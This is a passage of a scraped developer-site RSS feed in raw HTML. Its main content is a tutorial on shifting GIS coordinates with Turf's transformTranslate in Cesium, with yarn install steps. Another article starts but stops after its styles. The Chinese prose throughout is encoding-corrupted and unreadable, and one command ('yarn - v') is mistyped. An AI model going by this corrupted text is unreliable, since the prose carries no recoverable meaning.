<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fwww.bycwedu.com%2Fpromotion_channels%2F2146264125" target="_blank" title="https://link.zhihu.com/?target=https%3A//www.bycwedu.com/promotion_channels/2146264125" ref="nofollow noopener noreferrer">çŸ¥ä¹ - å®‰å…¨ä¸­å¿ƒwww.bycwedu.com/promotion_channels/2146264125</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cesium ä½¿ç”¨ Turf å®ç°åæ ‡ç‚¹ç§»åŠ¨ï¼ˆåç§»ï¼‰]]></title>    <link>https://juejin.cn/post/7588570963295256619</link>    <guid>https://juejin.cn/post/7588570963295256619</guid>    <pubDate>2025-12-29T06:53:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588570963295256619" data-draft-id="7589159665838719019" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cesium ä½¿ç”¨ Turf å®ç°åæ ‡ç‚¹ç§»åŠ¨ï¼ˆåç§»ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,cesium,GIS"/> <meta itemprop="datePublished" content="2025-12-29T06:53:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²äº‘ä¸€é¹¤"/> <meta itemprop="url" content="https://juejin.cn/user/729731452122382"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cesium ä½¿ç”¨ Turf å®ç°åæ ‡ç‚¹ç§»åŠ¨ï¼ˆåç§»ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731452122382/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²äº‘ä¸€é¹¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:53:36.000Z" title="Mon Dec 29 2025 06:53:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ gis é¡¹ç›®ä¸­ï¼Œåæ ‡ç‚¹åç§»ç®—æ˜¯å¸¸è§éœ€æ±‚äº†ã€‚æˆ‘ä»¬é€šè¿‡è®¾ç½®ç»Ÿä¸€çš„è§„åˆ™ï¼Œè®© poi åæ ‡è¿›è¡Œä¸€å®šé‡çš„åç§»ï¼Œä»è€Œè¾¾åˆ°ä¿å¯†çš„è¦æ±‚ã€‚</p>
<p>å…ˆç»™å¤§å®¶çœ‹çœ‹æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611fd5839f0740a29046c8c9c89cad49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596015&amp;x-signature=mPTqmAlFtt3GtorFYjQxTyZqwk8%3D" alt="cover.gif" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘å…ˆç‚¹å‡»äº† 3 ä¸‹è·ç¦»åç§»ï¼Œè®©åŸå§‹ç‚¹ä½æ ¹æ®æˆ‘æä¾›çš„ 200 ç±³ï¼Œ400 ç±³ï¼Œ600 ç±³ è¿›è¡Œäº†å‘å³åç§»å¹¶æ‰“äº†å‡ ä¸ªç‚¹</p>
<p>ç„¶åç‚¹å‡»äº†æ–¹å‘è§’åç§»ï¼Œåˆ†åˆ«æ˜¯ 30ï¼Œ60ï¼Œ90ï¼Œ120 ç­‰ï¼Œè®©åŸå§‹ç‚¹ä½æ ¹æ®æˆ‘æä¾›çš„æ–¹å‘è§’è¿›è¡Œäº†åç§»å¹¶æ‰“ç‚¹</p>
<p>å®é™…åº”ç”¨ä¸­å°±å¯ä»¥ç»™åæ ‡ç‚¹åŠ ä¸Šè·ç¦»å’Œæ–¹å‘è§’çš„åç§»ï¼Œéšè—åŸå§‹çš„åæ ‡ç‚¹ä½</p>
<h2 data-id="heading-1">å®æˆ˜æ•™å­¦</h2>
<p>ä¸‹é¢è¿›è¡Œå®æˆ˜æ•™å­¦ï¼Œè¿™é‡Œæˆ‘ä»¬å€Ÿç”¨äº† <code>Turf</code> åº“é‡Œé¢çš„ <code>transformTranslate</code> å‡½æ•°æ¥å®ç°åæ ‡ç‚¹çš„ç§»åŠ¨ï¼ˆåç§»ï¼‰</p>
<p>é¦–å…ˆéœ€è¦å®‰è£… Turfï¼Œå®˜æ–¹æ–‡æ¡£è®©æˆ‘ä»¬ä½¿ç”¨ <code>npm install @turf/turf</code> å‘½ä»¤è¿›è¡Œå®‰è£…ï¼Œå¯æ˜¯æˆ‘å‘ç°ç”¨ npm è¿™ç©æ„ install è€æ˜¯ä¼šæŠ¥é”™ï¼Œå°±åƒè¿™æ ·</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df1e3d15c91a4f8783810d4cda4ffa7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596015&amp;x-signature=60%2FSjXeey5G7sPxe%2BEOXvsgl82s%3D" alt="1.png" loading="lazy"/></p>
<p>æ‰€ä»¥æˆ‘æ‰“ç®—é‡‡å– yarn å®‰è£…</p>
<p>å…ˆå…¨å±€å®‰è£… yarn</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g yarn
</code></pre>
<p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</p>
<pre><code class="hljs language-bash" lang="bash">yarn - v
</code></pre>
<p>æˆ‘æœ¬åœ°å·²ç»æå‰å®‰è£…è¿‡äº† yarnï¼Œæ‰€ä»¥ç›´æ¥æŸ¥è¯¢ç‰ˆæœ¬å·</p>
<p>ä½¿ç”¨ yarn å®‰è£… turf</p>
<pre><code class="hljs language-bash" lang="bash">yarn add @turf/turf
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8f0bf99015648d18d58dd716caa6c24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596015&amp;x-signature=15aROT8gaxbGpRu76oPsAS6pq6Y%3D" alt="2.png" loading="lazy"/></p>
<p>é€Ÿåº¦å¾ˆå¿«ï¼Œä¸€æ¬¡æˆåŠŸ</p>
<p>å¼•å…¥ turf</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> turf <span class="hljs-keyword">from</span> <span class="hljs-string">"@turf/turf"</span>;
</code></pre>
<p>ä½¿ç”¨ turf</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªç‚¹è¦ç´ </span>
<span class="hljs-keyword">const</span> point = turf.<span class="hljs-title function_">point</span>([<span class="hljs-number">113.39179694652559</span>, <span class="hljs-number">23.165830666454557</span>]); <span class="hljs-comment">// [ç»åº¦, çº¬åº¦]</span>

<span class="hljs-comment">// å°†ç‚¹å‘ä¸œåŒ—æ–¹å‘ï¼ˆè§’åº¦45åº¦ï¼‰å¹³ç§»100ç±³</span>
<span class="hljs-keyword">const</span> newCoords = turf.<span class="hljs-title function_">transformTranslate</span>(
  point,
  <span class="hljs-number">100</span>, <span class="hljs-comment">// è·ç¦»ï¼š100ç±³</span>
  <span class="hljs-number">45</span>, <span class="hljs-comment">// æ–¹å‘è§’ï¼š45åº¦ï¼ˆä¸œåŒ—æ–¹å‘ï¼‰</span>
  { <span class="hljs-attr">units</span>: <span class="hljs-string">"meters"</span> } <span class="hljs-comment">// é€‰é¡¹ï¼šæŒ‡å®šè·ç¦»å•ä½ä¸ºç±³</span>
);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŸå§‹ç‚¹åæ ‡ï¼š"</span>, point);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¹³ç§»åç‚¹åæ ‡ï¼š"</span>, newCoords);
</code></pre>
<p>æ³¨æ„ï¼è¿™é‡Œçš„ <code>turf.point</code> å’Œ <code>turf.transformTranslate</code> æ–¹æ³•å¹¶ä¸ä¼šç›´æ¥åœ¨åœ°å›¾ä¸Šåˆ›å»ºä¸€ä¸ª poi ç‚¹ä½ï¼Œä»–ä»¬åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªç”¨äºè®¡ç®—ç‚¹ä½çš„å®ä¾‹æ–¹æ³•ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡è·å–å®ƒè®¡ç®—å‡ºæ¥çš„ç»çº¬åº¦çš„å€¼ï¼Œç„¶åè‡ªå·±ç”¨äºåœ°å›¾ä¸Šè¿›è¡Œæ‰“ç‚¹</p>
<p>æˆ‘ä»¬åªéœ€è¦å– geometry ä¸‹é¢çš„ coordinates å€¼å³å¯</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71654b023dc64c7b9c3328ecfb83f317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zey5LqR5LiA6bmk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596015&amp;x-signature=jgksP5Sjh0t7g6FelnzxVi2qqQk%3D" alt="3.png" loading="lazy"/></p>
<p>ç„¶åå°†è·å–çš„æ–°åæ ‡ç‚¹æ‰“åœ¨åœ°å›¾ä¸Šå°±å¥½å•¦</p>
<h2 data-id="heading-2">å‚æ•°è§£é‡Š</h2>
<p>transformTranslate å‡½æ•°å…±åŒ…å«å››ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šgeojsonï¼Œdistanceï¼Œdirectionï¼Œoptions</p>
<p><code>geojson(GeoJSON)</code>ï¼šè¦å¹³ç§»çš„ GeoJSON å¯¹è±¡ã€‚å¯ä»¥æ˜¯ç‚¹(Point)ã€çº¿(LineString)ã€é¢(Polygon)ç­‰ä»»ä½• GeoJSON å‡ ä½•ç±»å‹æˆ–è¦ç´ ï¼ˆFeatureï¼‰ã€‚</p>
<p><code>distance(number)</code>ï¼šè¦å¹³ç§»çš„è·ç¦»ï¼Œ<code>è´Ÿå€¼è¡¨ç¤ºç›¸åæ–¹å‘ç§»åŠ¨</code>ã€‚å•ä½é»˜è®¤ä¸ºå…¬é‡Œï¼ˆkilometersï¼‰ï¼Œå¦‚æœæƒ³æ¢æˆç±³çš„è¯éœ€è¦å°† options é€‰é¡¹è®¾ç½®ä¸º<code>units: "meters"</code></p>
<p><code>direction(number)</code>ï¼šè¦å¹³ç§»çš„æ–¹å‘è§’ï¼Œä»¥<code>åè¿›åˆ¶åº¦æ•°</code>è¡¨ç¤ºã€‚è§’åº¦ä»¥æ­£åŒ—ï¼ˆ0Â°ï¼‰ä¸ºèµ·ç‚¹ï¼Œé¡ºæ—¶é’ˆæ–¹å‘å¢åŠ ï¼ˆ90Â° æ˜¯ä¸œï¼Œ180Â° æ˜¯å—ï¼Œ270Â° æ˜¯è¥¿ï¼‰ã€‚</p>
<p><code>options(Object)</code>ï¼šé™„åŠ é€‰é¡¹å¯¹è±¡ï¼Œå…¶ä¸­åˆåŒ…å«ä¸‰ä¸ªå±æ€§ï¼Œåˆ†åˆ«ä¸ºï¼šunitsï¼ŒzTranslationï¼Œmutate</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`units(string)`</span>ï¼šè·ç¦»ï¼ˆdistanceï¼‰çš„å•ä½ï¼Œå¯é€‰å€¼åŒ…æ‹¬ <span class="hljs-string">'meters'</span>ï¼ˆç±³ï¼‰ã€<span class="hljs-string">'kilometers'</span>ï¼ˆåƒç±³ï¼Œæ­¤ä¸ºé»˜è®¤å€¼ï¼‰ã€<span class="hljs-string">'miles'</span>ï¼ˆè‹±é‡Œï¼‰ç­‰ã€‚

<span class="hljs-string">`zTranslation(number)`</span>: Z è½´æ–¹å‘ï¼ˆå‚ç›´æ–¹å‘ï¼‰çš„å¹³ç§»é‡ï¼Œå•ä½ä¸ distance ç›¸åŒã€‚ç”¨æ¥åç§»é«˜ç¨‹ã€‚æ³¨æ„ï¼šæ­¤å¹³ç§»ä»…å½“è¾“å…¥çš„ GeoJSON æ•°æ®æœ¬èº«åŒ…å«é«˜ç¨‹ä¿¡æ¯ï¼ˆZåæ ‡ï¼‰æ—¶æ‰ä¼šç”Ÿæ•ˆã€‚

<span class="hljs-string">`mutate(boolean)`</span>: æ˜¯å¦ç›´æ¥ä¿®æ”¹è¾“å…¥çš„ GeoJSON å¯¹è±¡ï¼Œè€Œä¸æ˜¯åˆ›å»ºæ–°å¯¹è±¡ã€‚è®¾ç½®ä¸º <span class="hljs-literal">true</span>å¯åœ¨å¤„ç†å¤§å‹æ•°æ®æ—¶æå‡æ€§èƒ½ï¼Œä½†ä¼šæ”¹å˜åŸå§‹æ•°æ®ã€‚
</code></pre>
<h2 data-id="heading-3">å‚è€ƒèµ„æ–™</h2>
<p>turf å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fturfjs.org%2Fdocs%2Fapi%2FtransformTranslate" target="_blank" title="https://turfjs.org/docs/api/transformTranslate" ref="nofollow noopener noreferrer">turfjs.org/docs/api/trâ€¦</a></p>
<p>units å¯é€‰å€¼ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fturfjs.org%2Fdocs%2Fnext%2Fapi%2Ftypes%2FUnits" target="_blank" title="https://turfjs.org/docs/next/api/types/Units" ref="nofollow noopener noreferrer">turfjs.org/docs/next/aâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°ç™½å…¥é—¨å¤§æ¨¡å‹ - ä»å¾®è°ƒæ¨¡å‹å¼€å§‹äº†è§£å¤§æ¨¡å‹]]></title>    <link>https://juejin.cn/post/7588733783572447270</link>    <guid>https://juejin.cn/post/7588733783572447270</guid>    <pubDate>2025-12-29T06:51:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783572447270" data-draft-id="7588799600166420490" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°ç™½å…¥é—¨å¤§æ¨¡å‹ - ä»å¾®è°ƒæ¨¡å‹å¼€å§‹äº†è§£å¤§æ¨¡å‹"/> <meta itemprop="keywords" content="Agent,LLM,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-29T06:51:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°ç™½å…¥é—¨å¤§æ¨¡å‹ - ä»å¾®è°ƒæ¨¡å‹å¼€å§‹äº†è§£å¤§æ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:51:01.000Z" title="Mon Dec 29 2025 06:51:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»23åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
